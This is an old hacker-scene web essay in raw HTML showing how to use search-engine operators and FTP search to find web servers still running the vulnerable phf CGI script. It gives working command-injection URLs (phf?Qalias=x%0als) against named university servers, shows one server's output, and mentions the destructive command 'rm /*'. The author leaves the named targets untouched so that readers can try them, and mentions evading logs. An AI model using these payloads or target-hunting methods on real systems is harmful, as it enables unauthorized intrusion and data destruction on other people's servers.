<font size="3" >I have an example of 
  searching effectively the net from my personal experience and it is good to 
  share <br>
  it with you fellow +HCUkers. Somebody asked to find some computers with the PHF
exploit. 
  <br>
  I wanted to test it and see how it works and decide to help him. For you
who 
  don't know nothing about it <br>
  DON'T LET me explain, just make a search for it through regular search
engines 
  (use your favorite which in my <br>
  opinion must support boolean searches) or Search in Fravia+ pages to find
out 
  about it. <br>
  If you don't know how, i must insist: <u>learn how to use the most 
important search engines first</u>, come to the reversing/hacking/whatever stuff later :-)</font></p>
<br><font size="3" >I did it once with
his 
  site (sorry). Here is the story. I was searching to find something (not
remember 
  now) <br>
  and i was sure that i had read something about this on Fravia's labyrinth
of 
  pages. <br>
  I did a search with altavista (my favorite) adding the keyword
host:www.fravia.net 
  and i add<br>
  </font><font size="3" >next the string i was
searching 
  for. What this means is that i asked <font color=blue>from a main search 
Engine</fonT> <br>
  to search only <font color=blue> inside a specific host</font> for the string i was looking for. <br>
  Unfortunately my search did'nt fish nothing at all. What do you do then in such cases? 
Quit? NO.
<br>
  Just go to engine's add URL, and add the pages you are interesting to. <br>
  After one or two days max perform once more the same search and you'll 
have your results. <br>
  (You see fravia+'s laziness sometimes is good because you have to find new ways
to get your job done :-).</font></p>
<p><font size="3" >Ok. Ok. For you
who are 
  lazy enough try simple nomad's www hack faq. (www.nmrc.org)</font></p>
<p><font size="3" >OOPS! Back to our
subject. 
  The phf exploit. I tried 5 or 6 URL's with no result, because it is a too <br>
  old exploit and many servers (by all means not all :-) have fixed it already... 
then i realized it was boring to 
  do this and i didn't want to get caught, since my IP address will be on numerus
log files on target's computer. But wait a minute... aren't machines born to
serve us?</font></p>
<p><font size="3" >So i thought
(since i 

  was looking for a file) i could do an ftp search and see what i'll come
up with. 
  <br>
  Try it go to http://ftpsearch.ntnu.no (serach again! Fravia+ pages to see
other 
  URLs of this search engine. many thanxs to Robin Hood+) and make a search in 
  phf. When you study the results you begin
  thinking. </font></p>
<p><font size="3" >1. all these servers 
  or some of them maybe have the magical file installed!</font></p>
<p><font size="3" >2.- most ftp servers 
  are installed in the same machines with http servers and therefore they
have 
  the <br>
  same name with a little difference we MUST change the ftp portion of the
name 
  with www.</font></p>
<p><b><font  size="4"
color="#0066FF">EXAMPLE 
  </font><font  size="2" color="#0066FF">
</font></b></p>
<p><font size="3" >We can see that one
of the 
  engines answers was <font color="#009933">ftp.cs.yale.edu
/usr/local/etc/httpd/cgi-bin/phf</font>. 
  Hmmm maybe we can fish out something if we try it, because of the edu
URL. They 
  don't dig it too much. Lets try the www location.</font></p>
<p><font size="3" >I gave the command to
my 
  Netscape browser <font color="#3366FF">http://www.cs.yale.edu/ </font>and i 
  came up with a Yale Univercity screen.<br>
  Oh! Noo. I read: Yale Univercity Computer science department. They probably 
  have fix it but since we came that far lets give it a try.</font></p>
<p><font size="3" >I gave the command to
my 
  Netscape browser <font
color="#3366FF">http://www.cs.yale.edu/cgi-bin/phf?Qalias=x%0als<br>
  </font> And here is the surprise!!. Their server was very kind and friendly 
  to answer my question. Here is its answer:<br>
  </font></p>
<h1>Query Results</h1>
<p> /usr/local/bin/ph -m alias=x ls

<font size="3" >What does it means? Imagine! The
current directory listing. Of course we can give many more commands like
Fravia's <br>rm /*<bR>Which I DO NOT recommand! Anyway I told you to check 
out fravia+'s pages... Try it on stupid servers if you can get them... 
But please DON'T damage the
targets above. It would be very stupid and very easyly fixed by the server's administrators 
once you do it. So leave the servers above undisturbed, so 
that other readers, reading this essay can check them out.</font></pre>
  <p><font size="3" >3.- Back to our thinking
job. 
    Maybe we can do the same think with a web search. My favorite is digital. 
    <br>
    Since we want as he (my friend) said edu domain because they have the
most 
    possibilities to have it installed, <br>
    we give the command <font color="#0066CC">domain:edu </font>and the
engine 
    will search only that domain </font> </font></p>
</div>
<p><font size="3" ><font >4.- Shoot
http://www.altavista.digital.com/cgi-bin/query?<br>

pg=q&what=web&kl=XX&q=domain%3Aedu+%2Bcgi-bin+%2Bphf&search.x=21&search.y=12
<br>
  </font></font></p>
<p><font size="3" ><font >5. Begin
search 
  and you will find diamonds. I tried one or two . If anybody try this one
<br>
  This one will work and i'm sure others.
http://www.met.tamu.edu/cgi-bin/phf?QAlias=x%0als 
  </font></font></p>
<p><font size="3" ><font >6.- Make a
search 
  in the domain edu and search only the links that reffered to cgi-bin/phf!!! 
  <br>
  Is this kool or what!!! Again i'll use digital
http://www.altavista.digital.com/cgi-bin/query?pg=q&what=web&kl=XX&q=domain%
3Aedu+link%3Acgi-bin%2Fphf&search.x=55&search.y=5<br>
  </font></font></p>
<p><font size="3" ><font >7.- make a
search 
  without the domain to see what you can find. Still the most are <br>
  univercities..(Probably the guy was right)
http://www.altavista.digital.com/cgi-bin/query?pg=q&what=web&kl=XX&q=l<br>
  ink%3A cgi-bin%2Fphf&next.x=43&next.y=9<br>
  Allright for those who don't know about domain:, host: link: etc press
the next 
  link<br>
  <a
href="https://searchlores.nickifaulk.com/&lt;i&gt;&lt;font&#32;size="3" >http://www.altavista.digital.com/av/content/help_simple.htm</font></i-" tppabs="http://fravia.net/<i><font%20size=%222%22%20face=%22Comic%20Sans%20MS%22>http://www.altavista.digital.com/av/content/help_simple.htm</font></i>"
>http://www.altavista.digital.com/av/content/help_simple.htm</a> 
  , or read. <br>
  What? Offcourse HCU pages. you can find a lot about searching the net. An
other 
  good tactic is to <br>
  read the help files of search engines. There are all in there. in front
of our 
  eyes. All we have to do is <br>
  just press the little button named Help.</font></font></p>
<p><font size="3" ><font >SEARCH. Search 
  for Simple Nomad's WEB hack FAQ. Many interesting things in
there.</font></font></p>
<p><font size="3" ><font >SEARCH. Find
GTMHH. 
  Very educational, All about email headers, etc.</font></font></p>
<p><font size="3" ><font >Hey ! I
don't give 
  you these links, because +Orc's tactic is to leave <br>
  something for the &quot;student&quot; . Anyway they are the easiest think
to 
  find. </font></font></p>
<p><font size="3" ><font >I want to send 
  my greetings to Aesculapius (where are you lost?). I love this
great +Teacher!</font></font></p>
<p><font size="3" ><font >Of Course
thanx 
  goes to Fravia+ because he made +Orc's dream true. </font></font></p>
